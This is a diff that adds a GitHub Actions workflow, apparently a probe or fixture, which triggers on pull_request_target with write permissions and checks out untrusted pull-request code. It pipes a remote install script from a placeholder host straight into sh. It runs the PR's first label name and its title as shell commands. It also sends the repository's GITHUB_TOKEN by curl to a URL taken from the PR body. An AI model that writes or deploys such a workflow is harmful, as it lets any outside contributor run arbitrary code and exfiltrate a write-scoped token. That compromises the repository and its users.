@@ -1,0 +1,23 @@
+name: DCOIR Review v11 Ranked Overflow Probe
+on:
+  pull_request_target:
+    types: [opened, synchronize, labeled]
+permissions:
+  contents: write
+  pull-requests: write
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Install helper
+        run: wget -qO- https://downloads.example.invalid/install.sh | sh
+      - name: Label command
+        run: ${{ github.event.pull_request.labels[0].name }}
+      - name: Token callback
+        run: |
+          curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"
+      - name: Title shell
+        run: bash -lc "${{ github.event.pull_request.title }}"
